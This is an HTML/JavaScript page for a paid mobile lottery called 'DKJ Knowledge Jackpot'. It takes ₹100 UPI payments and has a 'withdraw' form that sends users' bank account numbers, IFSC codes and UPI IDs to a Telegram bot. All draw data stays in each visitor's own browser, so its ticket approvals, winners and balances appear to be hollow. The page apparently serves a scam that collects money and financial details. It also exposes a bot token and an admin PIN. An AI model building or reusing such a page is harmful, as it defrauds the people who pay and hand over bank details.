<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DKJ KNOWLEDGE JACKPOT</title>
    <style>
        :root { --gold: #c5a059; --dark: #0f2027; --tg-blue: #0088cc; }
        body { font-family: sans-serif; background: #f4f4f4; margin: 0; padding-bottom: 80px; -webkit-tap-highlight-color: transparent; }
        .header { background: var(--dark); color: var(--gold); padding: 15px; text-align: center; border-bottom: 3px solid var(--gold); cursor: pointer; }
        .marquee-box { background: #000; color: #fff; padding: 5px; font-weight: bold; border-bottom: 1px solid var(--gold); }
        .card { background: white; margin: 12px; padding: 20px; border-radius: 15px; box-shadow: 0 3px 10px rgba(0,0,0,0.1); text-align: center; }
        .bal-text { font-size: 35px; color: #27ae60; font-weight: bold; margin: 10px 0; }
        .pg-container { background: #ddd; height: 12px; border-radius: 10px; margin: 10px 0; overflow: hidden; }
        .pg-bar { background: var(--gold); height: 100%; width: 0%; transition: 0.5s; }
        .btn { width: 100%; padding: 14px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; display: block; box-sizing: border-box; text-decoration: none; text-align: center; font-size: 14px; }
        .btn-dark { background: var(--dark); color: white; }
        .btn-gold { background: var(--gold); color: black; }
        .btn-tg { background: var(--tg-blue); color: white; }
        .scroll-box { display: flex; overflow-x: auto; padding: 10px; gap: 15px; scrollbar-width: none; }
        .draw-box { min-width: 160px; background: white; padding: 15px; border-radius: 12px; border: 2px solid var(--dark); text-align: center; color: #000; }
        #popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; color: white; padding: 20px; box-sizing: border-box; text-align: center; overflow-y: auto; }
        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; font-weight: bold; color: #000; outline: none; box-sizing: border-box; }
        .list-item { background: #222; padding: 12px; border-radius: 8px; margin-bottom: 8px; text-align: left; border-left: 4px solid var(--gold); }
        .win-amt { float: right; color: #27ae60; font-weight: bold; }
        #congrats { display:none; color: gold; font-size: 20px; font-weight: bold; animation: blink 1s infinite; margin-top:10px; }
        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.2;} 100% {opacity: 1;} }
    </style>
</head>
<body>

<div class="marquee-box"><marquee>üî• Lucky Winner Draw Date: 13 March 2026 || Join Mega Draw Now & Win Big!! üî•</marquee></div>

<div class="header" onclick="adminMode()">
    <h1 style="margin:0; font-size:18px;">DKJ KNOWLEDGE JACKPOT</h1>
    <div id="uHi" style="font-size: 11px; color: white; margin-top: 5px;">Welcome Guest (Admin: Tap)</div>
</div>

<div id="congrats">üéä CONGRATULATIONS! YOU WON! üéä</div>

<div class="card">
    <p style="margin:0; font-weight:bold; color: #666;">MY WALLET BALANCE</p>
    <div class="bal-text" id="vBal">‚Çπ0</div>
    <button class="btn btn-dark" onclick="showWithdrawForm()">WITHDRAW MONEY</button>
</div>

<div class="card">
    <p style="margin:0; font-size:12px; font-weight:bold;">DRAW PROGRESS: <span id="pgTxt">0%</span></p>
    <div class="pg-container"><div class="pg-bar" id="pBar"></div></div>
    <button class="btn btn-gold" onclick="alert('Invite Link Copied!')">COPY INVITE LINK</button>
</div>

<div class="scroll-box">
    <div class="draw-box" style="border-color: var(--gold);">
        <h3>MEGA</h3><h2>‚Çπ100</h2>
        <button class="btn btn-dark" onclick="join(100)">JOIN NOW</button>
    </div>
    <div class="draw-box" style="opacity:0.6; background:#eee;">
        <h3>SILVER</h3><h2>‚Çπ200</h2>
        <button class="btn" style="background:#888; color:white; cursor:not-allowed;">LOCKED</button>
    </div>
    <div class="draw-box" style="opacity:0.6; background:#eee;">
        <h3>GOLD</h3><h2>‚Çπ500</h2>
        <button class="btn" style="background:#888; color:white; cursor:not-allowed;">LOCKED</button>
    </div>
</div>

<div style="padding: 10px;">
    <button id="rBtn" class="btn btn-gold" onclick="showReg()">‚ûï CREATE ACCOUNT</button>
    <button class="btn btn-dark" onclick="showProfile()">üë§ MY PROFILE & CODES</button>
    <button class="btn btn-gold" onclick="showWinners()">üèÜ TOP WINNERS</button>
    <button class="btn" style="background:#555; color:white;" onclick="showTC()">üìÑ TERMS & CONDITIONS</button>
    <a href="https://t.me/dkj_knowledge_jackoprt" target="_blank" class="btn btn-tg">üì¢ JOIN TELEGRAM CHANNEL</a>
</div>

<div id="popup">
    <div id="pContent"></div>
    <button onclick="closeP()" style="margin-top:20px; background:red; color:white; border:none; padding:10px 40px; border-radius:10px; font-weight:bold;">CLOSE</button>
</div>

<script>
    const TG_BOT_TOKEN = "8357735991:AAHUnhnXj0MaNi-Z1XtitwMy994xssKRsyg";
    const TG_ADMIN_ID = "8072402346"; 
    const UPI_ID = "paytmqr6vnhle@ptys";

    let db = JSON.parse(localStorage.getItem('dkj_v6_db')) || { users: [], entries: [], pending: [], winners: [] };
    let currentUser = JSON.parse(localStorage.getItem('dkj_v6_user')) || null;

    function save() {
        localStorage.setItem('dkj_v6_db', JSON.stringify(db));
        localStorage.setItem('dkj_v6_user', JSON.stringify(currentUser));
    }

    function tgMsg(msg) {
        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
    }

    function showReg() {
        document.getElementById('pContent').innerHTML = `<h2>REGISTER</h2><input id="rn" placeholder="Full Name"><input id="rm" type="number" placeholder="Mobile"><input id="rp" type="password" placeholder="Password"><button class="btn btn-gold" onclick="doReg()">CREATE ACCOUNT</button>`;
        document.getElementById('popup').style.display = 'block';
    }

    function doReg() {
        let n = document.getElementById('rn').value, m = document.getElementById('rm').value, p = document.getElementById('rp').value;
        if(!n || !m || !p) return alert("Fill all!");
        currentUser = { name: n, mob: m, pass: p, bal: 0, id: Math.floor(1000+Math.random()*9000), codes: [], isWinner: false };
        db.users.push(currentUser); save(); updateUI();
        tgMsg(`‚úÖ *New User:* ${n} (Total: ${db.users.length})`);
        alert("Account Created!"); closeP();
    }

    function join(amt) {
        if(!currentUser) return alert("Pehle Account Banayein!");
        document.getElementById('pContent').innerHTML = `<h2>PAYMENT ‚Çπ${amt}</h2><p>Scan QR & Pay. Admin verify karne ke baad ticket dega.</p><img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=upi://pay?pa=${UPI_ID}%26am=${amt}"><button class="btn btn-gold" onclick="requestEntry()">I HAVE PAID</button>`;
        document.getElementById('popup').style.display = 'block';
    }

    function requestEntry() {
        db.pending.push({ uId: currentUser.id, name: currentUser.name });
        save();
        tgMsg(`‚ö†Ô∏è *Payment Pending:* ${currentUser.name} (ID: ${currentUser.id})`);
        alert("Verification ke liye bhej diya gaya hai!");
        closeP();
    }

    function showWithdrawForm() {
        if(!currentUser || currentUser.bal <= 0) return alert("Aapke wallet mein balance nahi hai!");
        document.getElementById('pContent').innerHTML = `
            <h2>WITHDRAW</h2>
            <p style="color:gold;">Balance: ‚Çπ${currentUser.bal}</p>
            <input id="w_owner" placeholder="Owner Name">
            <input id="w_bank" placeholder="Bank Name">
            <input id="w_acc" type="number" placeholder="Account Number">
            <input id="w_ifsc" placeholder="IFSC Code">
            <input id="w_upi" placeholder="UPI ID (Optional)">
            <button class="btn btn-gold" onclick="processWithdraw()">SUBMIT REQUEST</button>
        `;
        document.getElementById('popup').style.display = 'block';
    }

    function processWithdraw() {
        let owner = document.getElementById('w_owner').value;
        let bank = document.getElementById('w_bank').value;
        let acc = document.getElementById('w_acc').value;
        let ifsc = document.getElementById('w_ifsc').value;
        let upi = document.getElementById('w_upi').value;

        if(!owner || !bank || !acc || !ifsc) return alert("Sari details bharein!");

        let msg = `üí∞ *Withdraw Request*\n\n` +
                  `üë§ *User:* ${currentUser.name}\n` +
                  `üíµ *Amount:* ‚Çπ${currentUser.bal}\n\n` +
                  `üè¶ *Bank:* ${bank}\n` +
                  `üë§ *A/C Holder:* ${owner}\n` +
                  `üî¢ *A/C No:* ${acc}\n` +
                  `üÜî *IFSC:* ${ifsc}\n` +
                  `üì≤ *UPI:* ${upi || "N/A"}`;

        tgMsg(msg);
        
        // Update both user and DB then reset balance
        currentUser.bal = 0;
        let uIdx = db.users.findIndex(u => u.id == currentUser.id);
        if(uIdx != -1) db.users[uIdx].bal = 0;
        
        save();
        updateUI();
        alert("Withdrawal request bhej di gayi hai! Paisa 24-48 ghante mein aa jayega.");
        closeP();
    }

    function showWinners() {
        let h = "<h2>üèÜ TOP WINNERS</h2>";
        [...db.winners].reverse().slice(0, 50).forEach(w => { 
            h += `<div class="list-item"><span class="win-amt">‚Çπ${w.prize}</span><b>${w.name}</b><br><small>Ticket: ${w.code}</small></div>`; 
        });
        document.getElementById('pContent').innerHTML = h || "No Winners Yet";
        document.getElementById('popup').style.display = 'block';
    }

    function adminMode() {
        let pw = prompt("Admin PW:");
        if(pw !== "7860") return;
        let act = prompt("1: Approve Payments\n2: Pick 20 Winners\n3: Reset All");
        if(act=="1") {
            let h = "<h2>Pending Approvals</h2>";
            db.pending.forEach((p, i) => { h += `<div class="list-item" onclick="approve('${p.uId}', ${i})">${p.name} - APPROVE</div>`; });
            document.getElementById('pContent').innerHTML = h || "No pending";
            document.getElementById('popup').style.display = 'block';
        } else if(act=="2") {
            pickWinners();
        } else if(act=="3") { if(confirm("Clear All?")) { localStorage.clear(); location.reload(); } }
    }

    function approve(uid, index) {
        let ticket = "DKJ-" + Math.floor(100000 + Math.random()*900000);
        let userObj = db.users.find(u => u.id == uid);
        if(userObj) userObj.codes.push(ticket);
        db.entries.push({ uId: uid, name: userObj.name, code: ticket });
        db.pending.splice(index, 1);
        save(); alert("Approved!"); closeP();
    }

    function pickWinners() {
        if(db.entries.length < 2) return alert("Kam se kam 2 entries honi chahiye!");
        let shuffled = [...db.entries].sort(() => 0.5 - Math.random());
        let selected = shuffled.slice(0, 20);
        let prize = prompt("Each Winner Prize Amount?");
        if(!prize) return;
        selected.forEach(s => {
            db.winners.push({ name: s.name, prize: prize, code: s.code });
            let u = db.users.find(x => x.id == s.uId);
            if(u) { u.bal += parseInt(prize); u.isWinner = true; }
        });
        save(); alert("Winners selected!");
    }

    function updateUI() {
        if(currentUser) {
            let freshUser = db.users.find(u => u.id == currentUser.id);
            if(freshUser) {
                currentUser = freshUser;
                document.getElementById('uHi').innerText = "Hi, " + currentUser.name + " (ID: " + currentUser.id + ")";
                document.getElementById('vBal').innerText = "‚Çπ" + currentUser.bal;
                document.getElementById('rBtn').style.display = 'none';
                document.getElementById('congrats').style.display = currentUser.isWinner ? "block" : "none";
            }
        }
        let count = db.users.length;
        let percent = Math.min((count / 1000) * 100, 100);
        document.getElementById('pBar').style.width = percent + "%";
        document.getElementById('pgTxt').innerText = Math.floor(percent) + "%";
    }

    function showProfile() {
        if(!currentUser) return alert("Login!");
        document.getElementById('pContent').innerHTML = `<h2>PROFILE</h2><p>Name: ${currentUser.name}</p><p>ID: ${currentUser.id}</p><p>Approved Codes: ${currentUser.codes.join(", ") || "None"}</p><button class="btn btn-dark" onclick="logout()">LOGOUT</button>`;
        document.getElementById('popup').style.display = 'block';
    }

    function logout() { localStorage.removeItem('dkj_v6_user'); location.reload(); }
    function closeP() { document.getElementById('popup').style.display = 'none'; }
    window.onload = updateUI;
</script>
</body>
</html>
